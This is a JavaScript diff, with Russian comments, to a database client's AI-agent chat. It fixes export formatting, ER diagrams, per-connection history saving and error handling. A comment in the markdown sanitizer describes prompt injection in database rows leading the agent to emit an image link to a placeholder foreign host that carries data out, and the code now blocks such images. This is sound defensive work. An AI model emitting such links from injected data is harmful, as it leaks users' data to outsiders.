   const xmlEsc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
   function formatResult(fmt, columns, rows, name) {
-    const sqlV = (v) => v == null ? 'NULL' : typeof v === 'number' ? String(v) : "'" + String(v).replace(/'/g, "''") + "'";
-    const cell = (v) => v == null ? '' : (typeof v === 'object' ? JSON.stringify(v) : String(v));
+    const sqlV = lit;   // строки — в кавычках, числа — как есть, двоичные — X'…'
+    const cell = (v) => (v == null ? '' : fmtVal(v));
     if (fmt === 'csv') { const esc = (v) => v == null ? '' : /[",\n]/.test(cell(v)) ? '"' + cell(v).replace(/"/g, '""') + '"' : cell(v); return [columns.join(','), ...rows.map((r) => r.map(esc).join(','))].join('\n'); }
     if (fmt === 'tsv') { const esc = (v) => cell(v).replace(/[\t\n\r]/g, ' '); return [columns.join('\t'), ...rows.map((r) => r.map(esc).join('\t'))].join('\n'); }
-    if (fmt === 'json') return JSON.stringify(rows.map((r) => Object.fromEntries(columns.map((c, i) => [c, r[i]]))), null, 2);
-    if (fmt === 'jsonl') return rows.map((r) => JSON.stringify(Object.fromEntries(columns.map((c, i) => [c, r[i]])))).join('\n');
-    if (fmt === 'sql') return rows.map((r) => `INSERT INTO ${name || 'tbl'} (${columns.map(qIdent).join(', ')}) VALUES (${r.map(sqlV).join(', ')});`).join('\n');
+    const jv = (v) => (isBinary(v) ? fmtVal(v) : v);   // двоичные — hex-строкой, а не объектом {"0":137,…}
+    if (fmt === 'json') return JSON.stringify(rows.map((r) => Object.fromEntries(columns.map((c, i) => [c, jv(r[i])]))), null, 2);
+    if (fmt === 'jsonl') return rows.map((r) => JSON.stringify(Object.fromEntries(columns.map((c, i) => [c, jv(r[i])])))).join('\n');
+    if (fmt === 'sql') return rows.map((r) => `INSERT INTO ${qIdent(name || 'tbl')} (${columns.map(qIdent).join(', ')}) VALUES (${r.map(sqlV).join(', ')});`).join('\n');
     if (fmt === 'markdown') return '| ' + columns.join(' | ') + ' |\n| ' + columns.map(() => '---').join(' | ') + ' |\n' + rows.map((r) => '| ' + r.map((v) => cell(v).replace(/\|/g, '\\|').replace(/\n/g, ' ')).join(' | ') + ' |').join('\n');
     if (fmt === 'html') return `<table>\n  <thead><tr>${columns.map((c) => `<th>${xmlEsc(c)}</th>`).join('')}</tr></thead>\n  <tbody>\n${rows.map((r) => '    <tr>' + r.map((v) => `<td>${xmlEsc(cell(v))}</td>`).join('') + '</tr>').join('\n')}\n  </tbody>\n</table>`;
-    if (fmt === 'xml') return `<rows>\n${rows.map((r) => '  <row>' + columns.map((c, i) => `<${c}>${xmlEsc(cell(r[i]))}</${c}>`).join('') + '</row>').join('\n')}\n</rows>`;
+    // имя колонки не обязано быть допустимым XML-тегом («order id», «2023», «сумма, ₽») — чистим
+    const tag = (c) => { const t0 = String(c).replace(/[^\p{L}\p{N}_.-]/gu, '_'); return /^[\p{L}_]/u.test(t0) ? t0 : '_' + t0; };
+    if (fmt === 'xml') return `<rows>\n${rows.map((r) => '  <row>' + columns.map((c, i) => `<${tag(c)}>${xmlEsc(cell(r[i]))}</${tag(c)}>`).join('') + '</row>').join('\n')}\n</rows>`;
     return '';
   }
   // lightweight custom dropdown (styled) — value/label/desc; calls onChange(id)
@@ -1820,6 +1895,7 @@ export function initDb(host) {
     toast('Выгрузка всей таблицы…');
     const r = await lite.db.fetchAll(dbActiveId, t.schema, t.table, { where: t.where, orderBy: t.orderBy, orderDir: t.orderDir });
     if (r.error) { toast(r.error, { kind: 'err' }); return; }
+    if (r.total != null && r.total > r.rows.length) toast(`Выгружены первые ${r.rows.length} строк из ${r.total} — для полной выгрузки сузьте фильтр или выгрузите частями через SQL`, { kind: 'warn', ttl: 9000 });
     openExportModal(r, t.table);
   }
   function openExportModal(result, name) {
@@ -1879,9 +1955,13 @@ export function initDb(host) {
     if (rel.error) { host2.appendChild(el('div', 'docker-err', rel.error)); return; }
     const relations = rel.relations || [];
     // collect tables (from schema) and their columns from cache
+    // SQLite: схема в дереве — «main», а связи приходят без схемы; без нормализации каждая таблица
+    // рисовалась дважды (блок из дерева без линий + блок из связей)
+    const sqlite = dbActiveConn && dbActiveConn.type === 'sqlite';
+    const fullKey = (sc, tb) => (sqlite || !sc ? tb : sc + '.' + tb);
     const tableSet = new Set();
-    for (const sch of (dbSchema?.schemas || [])) for (const tb of sch.tables) if (!tb.view) tableSet.add((sch.name ? sch.name + '.' : '') + tb.name);
-    for (const r of relations) { tableSet.add((r.fromSchema ? r.fromSchema + '.' : '') + r.fromTable); tableSet.add((r.toSchema ? r.toSchema + '.' : '') + r.toTable); }
+    for (const sch of (dbSchema?.schemas || [])) for (const tb of sch.tables) if (!tb.view) tableSet.add(fullKey(sch.name, tb.name));
+    for (const r of relations) { tableSet.add(fullKey(r.fromSchema, r.fromTable)); tableSet.add(fullKey(r.toSchema, r.toTable)); }
     const names = [...tableSet];
     if (!names.length) { host2.appendChild(el('div', 'docker-empty', 'Нет таблиц для диаграммы.')); return; }
     // grid layout
@@ -1893,7 +1973,6 @@ export function initDb(host) {
     const svg = document.createElementNS(svgNS, 'svg'); svg.setAttribute('class', 'db-er-svg'); svg.setAttribute('width', W); svg.setAttribute('height', H);
     const linesG = document.createElementNS(svgNS, 'g'); svg.appendChild(linesG);
     const boxesG = document.createElementNS(svgNS, 'g'); svg.appendChild(boxesG);
-    const fullKey = (s, tb) => (s ? s + '.' : '') + tb;
     function drawLines() {
       linesG.innerHTML = '';
       for (const r of relations) {
@@ -2115,8 +2194,10 @@ export function initDb(host) {
     };
   }
   // запись отложенная: aiPersist зовут после каждого чанка диалога, а файл писать столько раз незачем
-  function aiPersist() {
-    const connId = dbActiveId;
+  // connId — подключение, чей диалог изменился. По умолчанию активное, но ответ агента и результат
+  // запроса приходят асинхронно: переключился на другую базу, пока шёл поток, — сохранять надо ту,
+  // где идёт диалог, иначе последний ответ жил бы только в памяти и терялся при закрытии окна.
+  function aiPersist(connId = dbActiveId) {
     const d = aiChats.get(connId);
     if (!d || !aiLoaded.has(connId)) return;   // до загрузки не пишем — затёрли бы историю на диске
     const prev = aiSaveTimers.get(connId); if (prev) clearTimeout(prev);
@@ -2322,24 +2403,30 @@ export function initDb(host) {
     return parts;
   }
   // render agent markdown to sanitized HTML (defense-in-depth: CSP blocks scripts, we still
-  // strip dangerous tags / on*-handlers / non-allowlisted URL schemes — same pattern as openrouter.js)
-  function mdInto(node, src) {
-    let html;
-    try { html = marked.parse(String(src || ''), { gfm: true, breaks: true }); } catch (_) { node.textContent = src || ''; return; }
+  // strip dangerous tags / on*-handlers / non-allowlisted URL schemes — same pattern as openrouter.js).
+  // Внешние картинки (src http/https) тоже вырезаем: агент видит строки базы, и prompt-инъекция в
+  // данных могла бы заставить его вставить ![](https://чужой.хост/?d=<данные>) — картинка загрузилась бы
+  // сама, без единого клика, и унесла данные. Ссылки остаются: наружу они уходят только по клику.
+  function sanitizeMdHtml(html) {
     const tpl = document.createElement('template'); tpl.innerHTML = html;
-    tpl.content.querySelectorAll('script,style,iframe,object,embed,link,meta,form').forEach((n) => n.remove());
+    tpl.content.querySelectorAll('script,style,iframe,object,embed,link,meta,form,base').forEach((n) => n.remove());
     tpl.content.querySelectorAll('*').forEach((n) => {
       [...n.attributes].forEach((a) => {
         const name = a.name.toLowerCase();
-        if (name.startsWith('on')) { n.removeAttribute(a.name); return; }
+        if (name.startsWith('on') || name === 'srcset' || name === 'style') { n.removeAttribute(a.name); return; }
         if (name === 'href' || name === 'src') {
           let proto; try { proto = new URL(a.value, location.href).protocol; } catch (_) { n.removeAttribute(a.name); return; }
-          const ok = (name === 'src') ? ['http:', 'https:', 'data:'] : ['http:', 'https:', 'mailto:'];
+          const ok = (name === 'src') ? ['data:'] : ['http:', 'https:', 'mailto:'];
           if (!ok.includes(proto)) n.removeAttribute(a.name);
         }
       });
     });
-    node.innerHTML = tpl.innerHTML;
+    return tpl.innerHTML;
+  }
+  function mdInto(node, src) {
+    let html;
+    try { html = marked.parse(String(src || ''), { gfm: true, breaks: true }); } catch (_) { node.textContent = src || ''; return; }
+    node.innerHTML = sanitizeMdHtml(html);
   }
 
   // ── AI providers (global, shared by all DBs): CLI (claude/codex) + OpenAI-compatible APIs
@@ -2518,9 +2605,10 @@ export function initDb(host) {
     const saveHtml = async () => {
       const pngs = aiChartPngs(host);
       const withCharts = md.replace(/\{\{chart:([^}]*)\}\}/g, (_m, mid) => (pngs.get(mid) ? `<img src="${pngs.get(mid)}" alt="график">` : ''));
-      let body; try { body = marked.parse(withCharts, { gfm: true, breaks: true }); } catch (_) { body = null; }
+      // тот же фильтр, что в чате: отчёт откроют в браузере, а текст агента мог нести разметку со скриптом
+      let body; try { body = sanitizeMdHtml(marked.parse(withCharts, { gfm: true, breaks: true })); } catch (_) { body = null; }
       if (body == null) { toast('Не удалось собрать HTML-отчёт', { kind: 'err' }); return; }
-      const html = `<!doctype html><html lang="ru"><head><meta charset="utf-8"><title>${aiSessTitle(st)}</title>
+      const html = `<!doctype html><html lang="ru"><head><meta charset="utf-8"><title>${xmlEsc(aiSessTitle(st))}</title>
 <style>body{font:14px/1.55 -apple-system,Segoe UI,Roboto,sans-serif;max-width:60rem;margin:2rem auto;padding:0 1rem;color:#1a1d21}
 h1{font-size:1.6rem}h2{font-size:1.2rem;margin-top:2rem}h3{font-size:1rem;color:#555}
 table{border-collapse:collapse;margin:.6rem 0;font-size:.85rem;display:block;overflow-x:auto}
@@ -3048,7 +3136,7 @@ blockquote{border-left:3px solid #c9ced4;margin:0;padding:.2rem 0 .2rem .8rem;co
   // ── предохранители выполнения: время запроса ограничиваем всегда, а на PRODUCTION ещё и
   // спрашиваем подтверждение и предлагаем LIMIT — тяжёлое чтение на боевой базе тоже инцидент.
   const AI_TIMEOUT_MS = 30000, AI_PROD_TIMEOUT_MS = 15000, AI_PROD_LIMIT = 1000;
-  function sqlStripped(sql) { return String(sql).replace(/--[^\n]*/g, '').replace(/\/\*[\s\S]*?\*\//g, '').replace(/'(?:[^']|'')*'/g, "''"); }
+  const sqlStripped = stripSqlLiterals;   // без комментариев и литералов — общий разбор lib/sqlro.js
   function sqlHasLimit(sql) { return /\blimit\b|\bfetch\s+first\b|\btop\s+\d/i.test(sqlStripped(sql)); }
   function sqlIsSingleSelect(sql) {
     const t = sqlStripped(sql).replace(/;\s*$/, '');
@@ -3126,6 +3214,7 @@ blockquote{border-left:3px solid #c9ced4;margin:0;padding:.2rem 0 .2rem .8rem;co
     const sql = await aiProdConfirm(withParams);
     if (!sql) return;   // на PRODUCTION пользователь отказался
     const st = aiSession();
+    const chatConn = dbActiveId;   // чей это диалог (запрос может идти на другую базу — connId)
     const connId = opts.connId || dbActiveId;
     const conn = dbConnsList.find((c) => c.id === connId) || dbActiveConn;
     const isProd = !!(conn && conn.isProd);
@@ -3136,7 +3225,9 @@ blockquote{border-left:3px solid #c9ced4;margin:0;padding:.2rem 0 .2rem .8rem;co
     resMsg.pending = false;
     if (r && r.error) resMsg.error = r.error; else if (r) { resMsg.columns = r.columns; resMsg.colTypes = r.colTypes; resMsg.rows = r.rows; }
     resMsg.summary = (onOtherDb ? `База: ${aiConnName(connId)}\n` : '') + aiResultSummary(sql, r || {});
-    aiPersist(); aiRefreshMsg(host, resMsg);
+    aiPersist(chatConn); aiRefreshMsg(host, resMsg);
+    // пока шёл запрос, открыли другую базу — не зовём агента с её схемой к чужому диалогу
+    if (dbActiveId !== chatConn) return;
     // feed the result back so the agent writes a conclusion / next step (unless the user turned it off)
     if (opts.report != null ? opts.report : aiAutoReport()) aiRun(host);
   }
@@ -3227,17 +3318,25 @@ blockquote{border-left:3px solid #c9ced4;margin:0;padding:.2rem 0 .2rem .8rem;co
   }
   async function aiRun(host) {
     const data = aiData(); const st = aiSession(); if (st._busy) return; st._busy = true;
-    if (!dbColsCache) { const cr = await lite.db.columns(dbActiveId); if (cr && !cr.error) dbColsCache = cr.columns || {}; }
-    if (!dbRelationsCache) { try { await getRelations(); } catch (_) {} }
-    await aiEnsureMeta(st);   // типы/PK/FK для таблиц, которые точно попадут в промпт
-    await aiLoadExtras();     // комментарии и частые значения колонок (один раз на подключение)
-    await aiLoadExtraSchemas(st);   // схемы дополнительных баз, если их подключили к контексту
+    const chatConn = dbActiveId;   // поток может закончиться, когда активна уже другая база
+    // подготовка контекста до отправки; сорвалась — снимаем «занят», иначе поле ввода осталось бы заблокированным
+    try {
+      if (!dbColsCache) { const cr = await lite.db.columns(dbActiveId); if (cr && !cr.error) dbColsCache = cr.columns || {}; }
+      if (!dbRelationsCache) { try { await getRelations(); } catch (_) {} }
+      await aiEnsureMeta(st);   // типы/PK/FK для таблиц, которые точно попадут в промпт
+      await aiLoadExtras();     // комментарии и частые значения колонок (один раз на подключение)
+      await aiLoadExtraSchemas(st);   // схемы дополнительных баз, если их подключили к контексту
+    } catch (e) {
+      st._busy = false; aiSyncBusy(host);
+      toast('Не удалось подготовить запрос агенту: ' + (e && e.message ? e.message : e), { kind: 'err' });
+      return;
+    }
     const asst = { role: 'assistant', text: '', streaming: true }; st.messages.push(asst);
     aiAppendMsg(host, asst);
     const reqId = 'dbai-' + (++aiSeq) + '-' + dbActiveId; st._reqId = reqId;
     let offData, offDone, offErr, offUsage;
     const cleanup = () => { offData && offData(); offDone && offDone(); offErr && offErr(); offUsage && offUsage(); st._busy = false; st._reqId = null; st._streamEl = null; };
-    offUsage = lite.dbai.onUsage((d) => { if (d.reqId !== reqId) return; aiAddUsage(st, d.model, d.usage || {}); aiPersist(); aiSyncUsage(host); });
+    offUsage = lite.dbai.onUsage((d) => { if (d.reqId !== reqId) return; aiAddUsage(st, d.model, d.usage || {}); aiPersist(chatConn); aiSyncUsage(host); });
     // поток рисуем markdown'ом (сырой текст с ``` и заголовками читать невозможно), но не чаще
     // раза в STREAM_PAINT_MS — иначе разбор и перерисовка на каждый токен съедают кадры
     const STREAM_PAINT_MS = 120;
@@ -3260,20 +3359,31 @@ blockquote{border-left:3px solid #c9ced4;margin:0;padding:.2rem 0 .2rem .8rem;co
     });
     offDone = lite.dbai.onDone((d) => {
       if (d.reqId !== reqId) return;
-      asst.streaming = false; cleanup(); aiPersist(); aiRefreshMsg(host, asst);
+      asst.streaming = false; cleanup(); aiPersist(chatConn); aiRefreshMsg(host, asst);
+      if (dbActiveId !== chatConn) return;   // структуру подставляем только в видимый диалог
       aiMaybeAutoSchema(host, asst).catch((e) => toast('Не удалось подставить структуру: ' + (e && e.message ? e.message : e), { kind: 'err' }));
     });
-    offErr = lite.dbai.onError((d) => { if (d.reqId !== reqId) return; asst.streaming = false; if (!asst.text) asst.text = '⚠️ ' + (d.error || 'ошибка агента'); cleanup(); aiPersist(); aiRefreshMsg(host, asst); toast(d.error || 'Ошибка агента', { kind: 'err' }); });
+    const onErr = (d) => { if (d.reqId !== reqId) return; asst.streaming = false; if (!asst.text) asst.text = '⚠️ ' + (d.error || 'ошибка агента'); cleanup(); aiPersist(chatConn); aiRefreshMsg(host, asst); toast(d.error || 'Ошибка агента', { kind: 'err' }); };
+    offErr = lite.dbai.onError(onErr);
     const ag = parseAgentId(data.agent);
     if (ag.kind === 'claude' || ag.kind === 'codex') { lite.dbai.run(reqId, ag.kind, buildAiPrompt(st)); return; }
-    // API providers (OpenRouter / Ollama / LM Studio)
+    // API providers (OpenRouter / Ollama / LM Studio). Ошибку настройки отдаём ОБРАБОТЧИКУ: раньше здесь
+    // звали offErr — функцию отписки, — и чат навсегда оставался «занят»: спиннер, кнопка «Стоп» без толку.
     const ep = providerEndpoint(ag.kind);
-    if (!ep || !ag.model) { offErr({ reqId, error: 'Провайдер не настроен. Откройте «⚙ Настроить модели…».' }); return; }
-    if (ag.kind === 'or' && !ep.key) { offErr({ reqId, error: 'Не задан API-ключ OpenRouter (⚙ Настроить модели…).' }); return; }
+    if (!ep || !ag.model) { onErr({ reqId, error: 'Провайдер не настроен. Откройте «⚙ Настроить модели…».' }); return; }
+    if (ag.kind === 'or' && !ep.key) { onErr({ reqId, error: 'Не задан API-ключ OpenRouter (⚙ Настроить модели…).' }); return; }
     lite.dbai.apiRun(reqId, { baseUrl: ep.base, key: ep.key, model: ag.model, messages: buildAiMessages(st), usage: ag.kind === 'or' });
   }
 
   function refresh() { dbSchema = null; dbColsCache = null; dbObjectsCache = null; metaCache.clear(); dbRelationsCache = null; aiExtrasByConn.clear(); invalidateTableCaches(); if (dbOpen) renderDbPanel(); }
   document.addEventListener('keydown', (e) => { if (dbOpen && dbActiveId && (e.ctrlKey || e.metaKey) && !e.shiftKey && e.key.toLowerCase() === 'p') { e.preventDefault(); openPalette(); } });
-  return { isOpen: () => dbOpen, setOpen: setDbOpen, toggle: toggleDb, renderPanel: renderDbPanel, refresh, openFromContainer, openSqlFromViewer };
+  // Закрытие окна: отложенная (400 мс) запись транскриптов AI-DB иначе терялась вместе с рендерером —
+  // последний ответ агента не доезжал до диска, если окно закрыли сразу после него.
+  async function confirmClose(proceed) {
+    const pending = [...aiSaveTimers.entries()];
+    aiSaveTimers.clear();
+    for (const [connId, timer] of pending) { clearTimeout(timer); await aiFlush(connId); }
+    proceed();
+  }
+  return { isOpen: () => dbOpen, setOpen: setDbOpen, refresh, openFromContainer, openSqlFromViewer, confirmClose };
 }
